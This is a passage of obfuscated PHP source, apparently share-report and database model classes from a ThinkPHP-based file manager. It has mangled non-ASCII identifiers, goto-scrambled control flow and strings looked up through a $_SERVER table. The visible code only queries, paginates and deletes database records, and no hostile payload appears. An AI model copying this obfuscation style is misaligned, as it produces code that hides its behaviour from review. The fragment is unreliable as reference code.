$c«ğ˜Î«Ì); } $FÇËÂø¶œÎ = array($dÖÏ°Ú½‡[468] => $c«ğ˜Î«Ì); goto a–¿Î˜àŠÌ; bÉìÑ·Ã§¢: } protected function removeBySource($b£ÁØãºÍ) { goto díÃé±Ğ”„; C¿ªÊª¯Ü: $d˜ÚÛ¡¦…™ = array_to_keyvalue($d˜ÚÛ¡¦…™, $CïƒŒª£Ò„[33], $CïƒŒª£Ò„[468]); if (!$d˜ÚÛ¡¦…™) { return; } $dŒóæç“® = array($CïƒŒª£Ò„[467] => array($CïƒŒª£Ò„[411], $d˜ÚÛ¡¦…™)); goto Bõ£É™”•å; Bõ£É™”•å: $this->where($dŒóæç“®)->delete(); Model($CïƒŒª£Ò„[577])->where($dŒóæç“®)->delete(); goto eÚä»¤ë¼‡; díÃé±Ğ”„: $CïƒŒª£Ò„ =& $_SERVER[æ§›¦ÌáØ]; $dŒóæç“® = array($CïƒŒª£Ò„[410] => array($CïƒŒª£Ò„[411], $b£ÁØãºÍ)); $d˜ÚÛ¡¦…™ = $this->field($CïƒŒª£Ò„[468])->where($dŒóæç“®)->select(); goto C¿ªÊª¯Ü; eÚä»¤ë¼‡: } public function listAll($c«İ½›Í’ê) { goto cœ Ğô™ã¶; DîŒÜçÄ·: if ($c«İ½›Í’ê[$f§Ü‡¯„ªê[714]]) { $dÙö…ù¯Ø· = $c«İ½›Í’ê[$f§Ü‡¯„ªê[476]] ? $c«İ½›Í’ê[$f§Ü‡¯„ªê[476]] : strtotime(date($f§Ü‡¯„ªê[1845])); $c›Ü¬¯ó±Â[$f§Ü‡¯„ªê[194]] = array($f§Ü‡¯„ªê[331], array($c«İ½›Í’ê[$f§Ü‡¯„ªê[714]], $dÙö…ù¯Ø·)); } if ($c«İ½›Í’ê[$f§Ü‡¯„ªê[29]]) { $c›Ü¬¯ó±Â[$c«İ½›Í’ê[$f§Ü‡¯„ªê[29]]] = 1; } else { $c›Ü¬¯ó±Â[] = array($f§Ü‡¯„ªê[473] => array($f§Ü‡¯„ªê[960], 0), $f§Ü‡¯„ªê[475] => array($f§Ü‡¯„ªê[960], 0), $f§Ü‡¯„ªê[1822] => $f§Ü‡¯„ªê[1776]); } if ($c«İ½›Í’ê[$f§Ü‡¯„ªê[1772]]) { $c›Ü¬¯ó±Â[] = array($f§Ü‡¯„ªê[470] => $c«İ½›Í’ê[$f§Ü‡¯„ªê[1772]], $f§Ü‡¯„ªê[1423] => array($f§Ü‡¯„ªê[380], "\45{$c«İ½›Í’ê[$f§Ü‡¯„ªê[1772]]}\45"), $f§Ü‡¯„ªê[1822] => $f§Ü‡¯„ªê[1776]); } goto BÈ±¼‰‡¦; cœ Ğô™ã¶: $f§Ü‡¯„ªê =& $_SERVER[æ§›¦ÌáØ]; $c›Ü¬¯ó±Â = array(); if ($c«İ½›Í’ê[$f§Ü‡¯„ªê[1520]]) { $c›Ü¬¯ó±Â[$f§Ü‡¯„ªê[1520]] = $c«İ½›Í’ê[$f§Ü‡¯„ªê[1520]]; } goto DîŒÜçÄ·; b‡Å“ˆŞÙ: return $c‘ÀÍ©¢•é; goto Bƒ‹¡œ¹²ç; BÈ±¼‰‡¦: $c‘ÀÍ©¢•é = $this->_makeOrder()->where($c›Ü¬¯ó±Â)->selectPage(20); if (empty($c‘ÀÍ©¢•é[$f§Ü‡¯„ªê[367]])) { return array(); } $this->_listDataApply($c‘ÀÍ©¢•é[$f§Ü‡¯„ªê[367]]); goto b‡Å“ˆŞÙ; Bƒ‹¡œ¹²ç: } public function listDataApply($Dø„¬¶›Ï ) { $this->_listDataApply($Dø„¬¶›Ï ); return $Dø„¬¶›Ï ; } private function _listDataApply(&$fù·­Èº) { goto eˆÂÚâ¬Íõ; dù‡ÄÂÀ×é: unset($Cß¿†²ÔÓ); $fù·­Èº = array_values($fù·­Èº); goto C»Úğõàíß; eˆÂÚâ¬Íõ: $dèÈåçÅµõ =& $_SERVER[æ§›¦ÌáØ]; $D‹ó†¸µ¦ = array_to_keyvalue($fù·­Èº, $dèÈåçÅµõ[33], $dèÈåçÅµõ[1520]); $eÚœ†ƒ·á¥ = Model($dèÈåçÅµõ[519])->userListInfo(array_unique($D‹ó†¸µ¦)); goto Aó­Æ³²·Š; Aó­Æ³²·Š: $B¥õÎŸ†Ìˆ = array_to_keyvalue($fù·­Èº, $dèÈåçÅµõ[33], $dèÈåçÅµõ[395]); $eæÙ‡âÔ¹ = Model($dèÈåçÅµõ[783])->sourceListInfo($B¥õÎŸ†Ìˆ, !0); foreach ($fù·­Èº as $Fãğ¹®ô­Ï => &$Cß¿†²ÔÓ) { $A‹ÅœàÇôÍ = $Cß¿†²ÔÓ[$dèÈåçÅµõ[1520]]; $Cß¿†²ÔÓ[$dèÈåçÅµõ[1846]] = $eÚœ†ƒ·á¥[$A‹ÅœàÇôÍ] ? $eÚœ†ƒ·á¥[$A‹ÅœàÇôÍ] : !1; $dÈ¿ñ‚¢Š = $Cß¿†²ÔÓ[$dèÈåçÅµõ[395]]; $Cß¿†²ÔÓ[$dèÈåçÅµõ[85]] = $eæÙ‡âÔ¹[$dÈ¿ñ‚¢Š] ? $eæÙ‡âÔ¹[$dÈ¿ñ‚¢Š] : !1; if ($Cß¿†²ÔÓ[$dèÈåçÅµõ[85]][$dèÈåçÅµõ[423]] == $dèÈåçÅµõ[87]) { unset($fù·­Èº[$Fãğ¹®ô­Ï]); } if ($Cß¿†²ÔÓ[$dèÈåçÅµõ[85]] != $dèÈåçÅµõ[191] && !$Cß¿†²ÔÓ[$dèÈåçÅµõ[85]]) { unset($fù·­Èº[$Fãğ¹®ô­Ï]); } } goto dù‡ÄÂÀ×é; C»Úğõàíß: } private function _makeOrder($c¹Œâ°…¶Ö = '') { goto AœÂçÈ—â›; AœÂçÈ—â›: $dâ¾ÇØøê =& $_SERVER[æ§›¦ÌáØ]; $C“åÑŒ¦ˆ = array($dâ¾ÇØøê[194], $dâ¾ÇØøê[476], $dâ¾ÇØøê[1835], $dâ¾ÇØøê[1836]); $AŠöºÌ’ = array($dâ¾ÇØøê[428] => $dâ¾ÇØøê[429], $dâ¾ÇØøê[430] => $dâ¾ÇØøê[431]); goto fÑ­ÙŸÒêá; fÑ­ÙŸÒêá: $a…•ÏÒ«Œ¼ = Input::get($dâ¾ÇØøê[435], $dâ¾ÇØøê[7], $dâ¾ÇØøê[416], $C“åÑŒ¦ˆ); $bªˆ±×¼ê… = Input::get($dâ¾ÇØøê[436], $dâ¾ÇØøê[7], $dâ¾ÇØøê[1847], array($dâ¾ÇØøê[1771], $dâ¾ÇØøê[430])); $bªˆ±×¼ê… = $AŠöºÌ’[$bªˆ±×¼ê…]; goto B•ÃÃ±ò; B•ÃÃ±ò: $c¹Œâ°…¶Ö = $c¹Œâ°…¶Ö . "{$a…•ÏÒ«Œ¼}\x20{$bªˆ±×¼ê…}"; return $this->order($c¹Œâ°…¶Ö); goto DŞÕ¬©…; DŞÕ¬©…: } public function reportAdd($EÔ˜ã·´²ö) { $E›¹ğ¦‡‹ =& $_SERVER[æ§›¦ÌáØ]; $CÆ•É•ÖÖ = array($E›¹ğ¦‡‹[468] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[468]], $E›¹ğ¦‡‹[1520] => USER_ID); if (Model($E›¹ğ¦‡‹[1843])->where($CÆ•É•ÖÖ)->find()) { return !1; } $Dœ¢ƒ¹…Å“ = array($E›¹ğ¦‡‹[468] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[468]], $E›¹ğ¦‡‹[1423] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[1423]], $E›¹ğ¦‡‹[395] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[395]], $E›¹ğ¦‡‹[447] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[447]], $E›¹ğ¦‡‹[1520] => USER_ID, $E›¹ğ¦‡‹[29] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[29]], $E›¹ğ¦‡‹[431] => $EÔ˜ã·´²ö[$E›¹ğ¦‡‹[431]]); return Model($E›¹ğ¦‡‹[1843])->add($Dœ¢ƒ¹…Å“); } public function reportList($F“ÄàÔ Œ) { goto d‰î©‹ÀÁò; d‰î©‹ÀÁò: $bºÓ›®ò® =& $_SERVER[æ§›¦ÌáØ]; $bÅ·Œ†¶³è = array(); if ($F“ÄàÔ Œ[$bºÓ›®ò®[714]]) { $DÙÅ™ğõô = $F“ÄàÔ Œ[$bºÓ›®ò®[476]] ? $F“ÄàÔ Œ[$bºÓ›®ò®[476]] : strtotime(date($bºÓ›®ò®[1845])); $bÅ·Œ†¶³è[$bºÓ›®ò®[194]] = array($bºÓ›®ò®[331], array($F“ÄàÔ Œ[$bºÓ›®ò®[714]], $DÙÅ™ğõô)); } goto FÂ·¶‹‡; aÊäÕŠ´: $this->_listDataApply($b‰Çç¯[$bºÓ›®ò®[367]]); return $b‰Çç¯; goto f¾§¶ƒä¹ò; FÂ·¶‹‡: if (isset($F“ÄàÔ Œ[$bºÓ›®ò®[29]]) && in_array($F“ÄàÔ Œ[$bºÓ›®ò®[29]], array($bºÓ›®ò®[87], $bºÓ›®ò®[1848], $bºÓ›®ò®[1849], $bºÓ›®ò®[1850], $bºÓ›®ò®[1851]))) { $bÅ·Œ†¶³è[$bºÓ›®ò®[29]] = $F“ÄàÔ Œ[$bºÓ›®ò®[29]]; } if (isset($F“ÄàÔ Œ[$bºÓ›®ò®[703]]) && in_array($F“ÄàÔ Œ[$bºÓ›®ò®[703]], array($bºÓ›®ò®[191], $bºÓ›®ò®[87], $bºÓ›®ò®[1848], $bºÓ›®ò®[1849]))) { $bÅ·Œ†¶³è[$bºÓ›®ò®[703]] = $F“ÄàÔ Œ[$bºÓ›®ò®[703]]; } $Fë×‚Õ £ = Input::get($bºÓ›®ò®[436], $bºÓ›®ò®[7], $bºÓ›®ò®[1847], array($bºÓ›®ò®[1771], $bºÓ›®ò®[430])); goto FÙ±‡ŸÉ…; FÆãˆ©öï—: if (empty($b‰Çç¯[$bºÓ›®ò®[367]])) { return array(); } $Fâ™É¢Èô = array_to_keyvalue_group($b‰Çç¯[$bºÓ›®ò®[367]], $bºÓ›®ò®[703], $bºÓ›®ò®[468]); if (!empty($Fâ™É¢Èô[0])) { $F“ÄàÔ Œ = $Fâ™É¢Èô[0]; $bÅ·Œ†¶³è = array($bºÓ›®ò®[468] => array($bºÓ›®ò®[7], $F“ÄàÔ Œ)); $cÛ›²ïÏÊ› = $this->where($bÅ·Œ†¶³è)->field($bºÓ›®ò®[468])->select(); $cÛ›²ïÏÊ› = array_to_keyvalue($cÛ›²ïÏÊ›, $bºÓ›®ò®[33], $bºÓ›®ò®[468]); $fÌƒ©¯±Ÿ· = array_diff($F“ÄàÔ Œ, $cÛ›²ïÏÊ›); if (!empty($fÌƒ©¯±Ÿ·)) { foreach ($b‰Çç¯[$bºÓ›®ò®[367]] as $FÖÙ¨÷Ä„¢ => $d÷ÌïÔ‘ƒµ) { if (in_array($d÷ÌïÔ‘ƒµ[$bºÓ›®ò®[468]], $fÌƒ©¯±Ÿ·)) { unset($b‰Çç¯[$bºÓ›®ò®[367]][$FÖÙ¨÷Ä„¢]); } } } } goto aÊäÕŠ´; FÙ±‡ŸÉ…: $BÍñÒ­Ì© = array($bºÓ›®ò®[428] => $bºÓ›®ò®[429], $bºÓ›®ò®[430] => $bºÓ›®ò®[431]); $e¼â»¤‹ªó = $bºÓ›®ò®[1852] . $BÍñÒ­Ì©[$Fë×‚Õ £]; $b‰Çç¯ = Model($bºÓ›®ò®[1843])->where($bÅ·Œ†¶³è)->order($e¼â»¤‹ªó)->selectPage(20); goto FÆãˆ©öï—; f¾§¶ƒä¹ò: } public function reportStatus($Aƒî±ÖªÄé) { goto dŒñÁ©; dŒñÁ©: $E×éŸ»µ’³ =& $_SERVER[æ§›¦ÌáØ]; $eÉº„»˜ø§ = array($E×éŸ»µ’³[393] => $Aƒî±ÖªÄé[$E×éŸ»µ’³[393]]); $A“Šïê†¬ = Model($E×éŸ»µ’³[1843])->where($eÉº„»˜ø§)->field($E×éŸ»µ’³[1853])->find(); goto BŒ²¥Ì¯´«; aÄªÏˆ¬¶: $eºåØôó¤¹ = Model($E×éŸ»µ’³[1843])->where($eÉº„»˜ø§)->save($eÙùãáÁóŠ); if ($Aƒî±ÖªÄé[$E×éŸ»µ’³[703]] == $E×éŸ»µ’³[1848]) { if ($A“Šïê†¬[$E×éŸ»µ’³[447]] != $E×éŸ»µ’³[191] && $this->shareFileMeta($A“Šïê†¬[$E×éŸ»µ’³[447]])) { $this->shareFileMeta($A“Šïê†¬[$E×éŸ»µ’³[447]], 0); } $this->remove($A“Šïê†¬[$E×éŸ»µ’³[468]]); return !0; } if ($eºåØôó¤¹ && $Aƒî±ÖªÄé[$E×éŸ»µ’³[703]] == $E×éŸ»µ’³[1849]) { $F©ºù»áœ = $eÙùãáÁóŠ[$E×éŸ»µ’³[703]] == $E×éŸ»µ’³[1849] ? 1 : 0; $this->shareFileMeta($A“Šïê†¬[$E×éŸ»µ’³[447]], $F©ºù»áœ); $this->removeByFile($A“Šïê†¬[$E×éŸ»µ’³[447]]); } goto Bá¼èµ®’; Bá¼èµ®’: return $eºåØôó¤¹; goto bÛƒ¿ÊÎ¦õ; BŒ²¥Ì¯´«: if (!$A“Šïê†¬) { return !1; } $eÙùãáÁóŠ = array($E×éŸ»µ’³[703] => $Aƒî±ÖªÄé[$E×éŸ»µ’³[703]]); if ($Aƒî±ÖªÄé[$E×éŸ»µ’³[703]] == $E×éŸ»µ’³[1849] && $A“Šïê†¬[$E×éŸ»µ’³[703]] == $E×éŸ»µ’³[1849]) { $eÙùãáÁóŠ[$E×éŸ»µ’³[703]] = 0; } goto aÄªÏˆ¬¶; bÛƒ¿ÊÎ¦õ: } private function removeByFile($fğèºí£•ä) { goto b´à¯íİ£Ë; b´à¯íİ£Ë: $cã¢†À×÷õ =& $_SERVER[æ§›¦ÌáØ]; $bÅ ï³àÏÓ = Model($cã¢†À×÷õ[783])->where(array($cã¢†À×÷õ[447] => $fğèºí£•ä))->field($cã¢†À×÷õ[395])->select(); $eÅÆ³ãÑ‰ = array_to_keyvalue($bÅ ï³àÏÓ, $cã¢†À×÷õ[33], $cã¢†À×÷õ[395]); goto F½â˜ã ¯š; F½â˜ã ¯š: $e¯ˆÍôÇä† = array($cã¢†À×÷õ[395] => array($cã¢†À×÷õ[7], $eÅÆ³ãÑ‰), $cã¢†À×÷õ[473] => 1); $bÅ ï³àÏÓ = $this->where($e¯ˆÍôÇä†)->field($cã¢†À×÷õ[468])->select(); if (empty($bÅ ï³àÏÓ)) { return; } goto Eƒ°¿Ô·µ; Eƒ°¿Ô·µ: $DÃ­Ôñª…Å = array_to_keyvalue($bÅ ï³àÏÓ, $cã¢†À×÷õ[33], $cã¢†À×÷õ[468]); $this->remove($DÃ­Ôñª…Å); goto dë½Ç¾¦³õ; dë½Ç¾¦³õ: } private function shareFileMeta($DñÖíóøªÖ, $A¤¬ƒª¢Ş = null) { $f††•„–Šà =& $_SERVER[æ§›¦ÌáØ]; $AÑÚç‰šªì = array($f††•„–Šà[447] => $DñÖíóøªÖ, $f††•„–Šà[93] => $f††•„–Šà[1854]); if (is_null($A¤¬ƒª¢Ş)) { return Model($f††•„–Šà[1855])->where($AÑÚç‰šªì)->find(); } $AÑÚç‰šªì[$f††•„–Šà[372]] = $A¤¬ƒª¢Ş; Model($f††•„–Šà[1855])->add($AÑÚç‰šªì, array(), !0); } } goto aî™øõßä; CÜÚ¨ˆğ’›: define($_SERVER[æ§›¦ÌáØ][240], 0); define($_SERVER[æ§›¦ÌáØ][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\x65", "\x6f\162\x64\x65\x72", "\x61\154\x69\x61\163", "\x68\141\x76\151\x6e\x67", "\x67\x72\157\165\x70", "\x6c\157\x63\x6b", "\144\x69\x73\164\151\x6e\x63\164", "\x61\165\x74\x6f", "\x66\x69\154\x74\x65\162", "\x76\141\x6c\151\144\x61\x74\145", "\162\x65\x73\165\154\x74", "\x62\151\156\x64", "\x74\157\153\145\156"); public function __construct($dÜäğóĞÉ‚ = '', $c‡´Ò‘í„ = '', $B©áª„Å‡ = '') { $cŒå˜¦‡ÏÓ =& $_SERVER[æ§›¦ÌáØ]; $this->_initialize(); if (!empty($dÜäğóĞÉ‚)) { if (strpos($dÜäğóĞÉ‚, $cŒå˜¦‡ÏÓ[95])) { list($this->dbName, $this->name) = explode($cŒå˜¦‡ÏÓ[95], $dÜäğóĞÉ‚); } else { $this->name = $dÜäğóĞÉ‚; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c‡´Ò‘í„)) { $this->tablePrefix = $cŒå˜¦‡ÏÓ[33]; } elseif ($cŒå˜¦‡ÏÓ[33] != $c‡´Ò‘í„) { $this->tablePrefix = $c‡´Ò‘í„; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($cŒå˜¦‡ÏÓ[242]); } $this->db(0, empty($this->connection) ? $B©áª„Å‡ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Fˆ„»²¸†À =& $_SERVER[æ§›¦ÌáØ]; if (empty($this->fields)) { if (think_config($Fˆ„»²¸†À[243])) { $a’°¦²Ì¡Â = $this->dbName ? $this->dbName : think_config($Fˆ„»²¸†À[244]); $Bí«Ú…î¶ = think_var_cache($Fˆ„»²¸†À[245] . strtolower(get_path_this($a’°¦²Ì¡Â) . $Fˆ„»²¸†À[95] . $this->name)); if ($Bí«Ú…î¶) { $CÖÉ…î¸‘ = think_config($Fˆ„»²¸†À[246]); if (empty($CÖÉ…î¸‘) || $Bí«Ú…î¶[$Fˆ„»²¸†À[247]] == $CÖÉ…î¸‘) { $this->fields = $Bí«Ú…î¶; return; } } } $this->flush(); } } public function flush() { goto e™ÈŒ¦ëí®; fÊíñÎ‘½Ø: if (!$D®Óåæö) { return !1; } $this->fields = array_keys($D®Óåæö); $this->fields[$cîç„ìùÌÏ[248]] = !1; goto BŒ½ÚŠ¨ƒ; B®„ùĞ¶»²: if (think_config($cîç„ìùÌÏ[243])) { $e¿É©¯ºïæ = $this->dbName ? $this->dbName : think_config($cîç„ìùÌÏ[244]); think_var_cache($cîç„ìùÌÏ[245] . strtolower(get_path_this($e¿É©¯ºïæ) . $cîç„ìùÌÏ[95] . $this->name), $this->fields); } goto bƒÃÁ®ë“Ü; e™ÈŒ¦ëí®: $cîç„ìùÌÏ =& $_SERVER[æ§›¦ÌáØ]; $this->db->setModel($this->name); $D®Óåæö = $this->db->getFields($this->getTableName()); goto fÊíñÎ‘½Ø; BŒ½ÚŠ¨ƒ: foreach ($D®Óåæö as $a‡Çî¬Ç¶¤ => $eÎêöùºÒ­) { $aè²àÊ“å†[$a‡Çî¬Ç¶¤] = $eÎêöùºÒ­[$cîç„ìùÌÏ[29]]; if ($eÎêöùºÒ­[$cîç„ìùÌÏ[36]]) { $this->fields[$cîç„ìùÌÏ[249]] = $a‡Çî¬Ç¶¤; if ($eÎêöùºÒ­[$cîç„ìùÌÏ[39]]) { $this->fields[$cîç„ìùÌÏ[248]] = !0; } } } $this->fields[$cîç„ìùÌÏ[250]] = $aè²àÊ“å†; if (think_config($cîç„ìùÌÏ[246])) { $this->fields[$cîç„ìùÌÏ[247]] = think_config($cîç„ìùÌÏ[246]); } goto B®„ùĞ¶»²; bƒÃÁ®ë“Ü: } public function switchModel($A´“ìè„, $A¼Æíó£¸Œ = array()) { $A‰Ì†–¯Š =& $_SERVER[æ§›¦ÌáØ]; $D…ºÇ‚‘œ¶ = ucwords(strtolower($A´“ìè„)) . $A‰Ì†–¯Š[251]; if (!class_exists($D…ºÇ‚‘œ¶)) { think_exception($D…ºÇ‚‘œ¶ . think_lang($A‰Ì†–¯Š[252])); } $this->_extModel = new $D…ºÇ‚‘œ¶($this->name); if (!empty($A¼Æíó£¸Œ)) { foreach ($A¼Æíó£¸Œ as $AƒÎçíèª±) { $this->_extModel->setProperty($AƒÎçíèª±, $this->{$AƒÎçíèª±}); } } return $this->_extModel; } public function __set($aéåïçŸ™ø, $BÄŠé±Îï) { $this->data[$aéåïçŸ™ø] = $BÄŠé±Îï; } public function __get($e¾ƒ¥ªˆ¿¼) { return isset($this->data[$e¾ƒ¥ªˆ¿¼]) ? $this->data[$e¾ƒ¥ªˆ¿¼] : null; } public function __isset($b†Ğ°ŠÄº) { return isset($this->data[$b†Ğ°ŠÄº]); } public function __unset($DïîØ÷Œ”ä) { unset($this->data[$DïîØ÷Œ”ä]); } public function __call($dğ³ìß¼‡É, $fÒšò“ƒ®‚) { $cêÊÈÈºã¡ =& $_SERVER[æ§›¦ÌáØ]; if (in_array(strtolower($dğ³ìß¼‡É), $this->methods, !0)) { $this->options[strtolower($dğ³ìß¼‡É)] = $fÒšò“ƒ®‚[0]; return $this; } elseif (in_array(strtolower($dğ³ìß¼‡É), array($cêÊÈÈºã¡[253], $cêÊÈÈºã¡[254], $cêÊÈÈºã¡[255], $cêÊÈÈºã¡[256], $cêÊÈÈºã¡[257]), !0)) { $Cí„Õ’ø = isset($fÒšò“ƒ®‚[0]) ? $fÒšò“ƒ®‚[0] : $cêÊÈÈºã¡[182]; $Cí„Õ’ø = $this->db->parseKey($Cí„Õ’ø); return $this->getField(strtoupper($dğ³ìß¼‡É) . $cêÊÈÈºã¡[258] . $Cí„Õ’ø . $cêÊÈÈºã¡[259] . $dğ³ìß¼‡É, $cêÊÈÈºã¡[253]); } elseif (strtolower(substr($dğ³ìß¼‡É, 0, 5)) == $cêÊÈÈºã¡[260]) { $Cí„Õ’ø = think_parse_name(substr($dğ³ìß¼‡É, 5)); $dºò‡Ÿ†´¨[$Cí„Õ’ø] = $fÒšò“ƒ®‚[0]; return $this->where($dºò‡Ÿ†´¨)->find(); } elseif (strtolower(substr($dğ³ìß¼‡É, 0, 10)) == $cêÊÈÈºã¡[261]) { $AÆœôÛ§ = think_parse_name(substr($dğ³ìß¼‡É, 10)); $dºò‡Ÿ†´¨[$AÆœôÛ§] = $fÒšò“ƒ®‚[0]; return $this->where($dºò‡Ÿ†´¨)->getField($fÒšò“ƒ®‚[1]); } elseif (isset($this->_scope[$dğ³ìß¼‡É])) { return $this->scope($dğ³ìß¼‡É, $fÒšò“ƒ®‚[0]); } elseif (method_exists($this, $dğ³ìß¼‡É)) { array_unshift($fÒšò“ƒ®‚, $dğ³ìß¼‡É); return call_user_func_array(array($this, $cêÊÈÈºã¡[262]), $fÒšò“ƒ®‚); } else { return call_user_func_array(array(parent, $dğ³ìß¼‡É), $fÒšò“ƒ®‚); } } protected function call() { goto f†£—‚Î×»; Cß‡º­õâ: $FÄæâÅßÇ‹ = call_user_func_array(array($this, $E¿—”ˆâó±), $Bİƒ¿…³¼µ); if (method_exists($this, $Aõ†ô×‰­œ[266])) { $B·§Õ¯ © = call_user_func_array(array($this, $Aõ†ô×‰­œ[267]), array($FîÌñ¿Ñ, $Bİƒ¿…³¼µ, $FÄæâÅßÇ‹)); if ($B·§Õ¯ ©) { return $B·§Õ¯ ©; } } return $FÄæâÅßÇ‹; goto e¸®ê¾°‡¾; c¤º—Ÿ³µ×: $FîÌñ¿Ñ = $E¿—”ˆâó±; if (is_array($E¿—”ˆâó±)) { $FîÌñ¿Ñ = $E¿—”ˆâó±[1]; $E¿—”ˆâó± = $E¿—”ˆâó±[0]; } $bÇî‹ˆ·ôÅ = count($Bİƒ¿…³¼µ) - 1; goto a¹—çù†•»; f†£—‚Î×»: $Aõ†ô×‰­œ =& $_SERVER[æ§›¦ÌáØ]; $Bİƒ¿…³¼µ = func_get_args(); $E¿—”ˆâó± = array_shift($Bİƒ¿…³¼µ); goto c¤º—Ÿ³µ×; a¹—çù†•»: if (isset($Bİƒ¿…³¼µ[$bÇî‹ˆ·ôÅ]) && $Bİƒ¿…³¼µ[$bÇî‹ˆ·ôÅ] === $E¿—”ˆâó±) { think_exception(__CLASS__ . $Aõ†ô×‰­œ[4] . $E¿—”ˆâó± . think_lang($Aõ†ô×‰­œ[263])); return; } $Bİƒ¿…³¼µ[] = $E¿—”ˆâó±; if (method_exists($this, $Aõ†ô×‰­œ[264])) { $B·§Õ¯ © = call_user_func_array(array($this, $Aõ†ô×‰­œ[265]), array($FîÌñ¿Ñ, $Bİƒ¿…³¼µ)); if (!is_null($B·§Õ¯ ©) && $B·§Õ¯ © !== !1) { return $B·§Õ¯ ©; } } goto Cß‡º­õâ; e¸®ê¾°‡¾: } protected function _initialize() { } protected function _facade($BïÕµçóŒ) { $Cá•æÉì‹ =& $_SERVER[æ§›¦ÌáØ]; if (!empty($this->fields)) { foreach ($BïÕµçóŒ as $Câ©Äƒ¯•¾ => $D„«…Ô‰±ˆ) { if (is_array($this->fields) && !in_array($Câ©Äƒ¯•¾, $this->fields, !0)) { unset($BïÕµçóŒ[$Câ©Äƒ¯•¾]); } elseif (is_scalar($D„«…Ô‰±ˆ)) { $this->_parseType($BïÕµçóŒ, $Câ©Äƒ¯•¾); } } } if (!empty($this->options[$Cá•æÉì‹[268]])) { $BïÕµçóŒ = array_map($this->options[$Cá•æÉì‹[268]], $BïÕµçóŒ); unset($this->options[$Cá•æÉì‹[268]]); } $this->_beforeWrite($BïÕµçóŒ); return $BïÕµçóŒ; } protected function _beforeWrite(&$eÑÔ†ŒÒ®) { } public function add($C¢—»·–•¬ = '', $EÂŞò‘È— = array(), $dÁğ‘›¤÷” = false) { goto eĞ«Ì‡ˆã‡; eĞ«Ì‡ˆã‡: if (empty($C¢—»·–•¬)) { if (!empty($this->data)) { $C¢—»·–•¬ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[æ§›¦ÌáØ][269]); return !1; } } $EÂŞò‘È— = $this->_parseOptions($EÂŞò‘È—); $C¢—»·–•¬ = $this->_facade($C¢—»·–•¬); goto DÒ¶ÒÀª«¯; CêôáÖäÚø: return $d…ò°ÏìºÒ; goto Eºœ¢êÁ¿; DÒ¶ÒÀª«¯: if (!1 === $this->_beforeInsert($C¢—»·–•¬, $EÂŞò‘È—)) { return !1; } $d…ò°ÏìºÒ = $this->db->insert($C¢—»·–•¬, $EÂŞò‘È—, $dÁğ‘›¤÷”); if (!1 !== $d…ò°ÏìºÒ) { $aÜ»““ÀÈ‘ = $this->getLastInsID(); if ($aÜ»““ÀÈ‘) { $C¢—»·–•¬[$this->getPk()] = $aÜ»““ÀÈ‘; $this->_after_insert($C¢—»·–•¬, $EÂŞò‘È—); return $aÜ»““ÀÈ‘; } $this->_after_insert($C¢—»·–•¬, $EÂŞò‘È—); } goto CêôáÖäÚø; Eºœ¢êÁ¿: } protected function _beforeInsert(&$D‚—“’¾¼‡, $d¦Œ¤ğî¤) { } protected function _after_insert($CõÖÚ‘À×, $a‰Øä¡ˆà) { } public function addAll($a·£¤¬ÑŠ, $cìªš„ã•‚ = array(), $b‚ÌÍ½ñµ = false) { goto a¢ì‰‚©¶˜; aÕÑŒà­™: foreach ($a·£¤¬ÑŠ as $f–¬ˆóÃÚ => $a’§Ç£ğ) { $a·£¤¬ÑŠ[$f–¬ˆóÃÚ] = $this->_facade($a’§Ç£ğ); } if (method_exists($this->db, $AŒäÒ¤[270])) { $d«õËŸ¿ø‹ = $this->db->insertAll($a·£¤¬ÑŠ, $cìªš„ã•‚, $b‚ÌÍ½ñµ); } else { $this->startTrans(); foreach ($a·£¤¬ÑŠ as $f–¬ˆóÃÚ => $a’§Ç£ğ) { $d«õËŸ¿ø‹ = $this->db->insert($a’§Ç£ğ, $cìªš„ã•‚, $b‚ÌÍ½ñµ); } $this->commit(); } if (!1 !== $d«õËŸ¿ø‹) { $Eå“ÂÛèÊ§ = $this->getLastInsID(); if ($Eå“ÂÛèÊ§) { return $Eå“ÂÛèÊ§; } } goto A¯†Ğ–Ò¾«; A¯†Ğ–Ò¾«: return $d«õËŸ¿ø‹; goto BÈ½íÛŸÓÁ; a¢ì‰‚©¶˜: $AŒäÒ¤ =& $_SERVER[æ§›¦ÌáØ]; if (empty($a·£¤¬ÑŠ)) { $this->error = think_lang($AŒäÒ¤[269]); return !1; } $cìªš„ã•‚ = $this->_parseOptions($cìªš„ã•‚); goto aÕÑŒà­™; BÈ½íÛŸÓÁ: } public function selectAdd($cÁÔ›Š™Ç = '', $EÃÈç¨àµ = '', $d­Í¯à’ƒé = array()) { $e½ËÒš‘¦² =& $_SERVER[æ§›¦ÌáØ]; $d­Í¯à’ƒé = $this->_parseOptions($d­Í¯à’ƒé); if (!1 === ($aÒ¥çÚô×Ä = $this->db->selectInsert($cÁÔ›Š™Ç ? $cÁÔ›Š™Ç : $d­Í¯à’ƒé[$e½ËÒš‘¦²[271]], $EÃÈç¨àµ ? $EÃÈç¨àµ : $this->getTableName(), $d­Í¯à’ƒé))) { $this->error = think_lang($e½ËÒš‘¦²[272]); return !1; } else { return $aÒ¥çÚô×Ä; } } public function save($BõĞ«·ÑØ = '', $Aï®¯Ú° = array()) { goto Dƒªš×Áğ; d ±Ùé´Õ´: if (!1 !== $FæÄÅÍÜŞœ) { if (isset($d‹Á†°Ş²ô)) { $BõĞ«·ÑØ[$Eœœ„áœ] = $d‹Á†°Ş²ô; } $this->_afterUpdate($BõĞ«·ÑØ, $Aï®¯Ú°); } return $FæÄÅÍÜŞœ; goto dò›Ô•İ­; 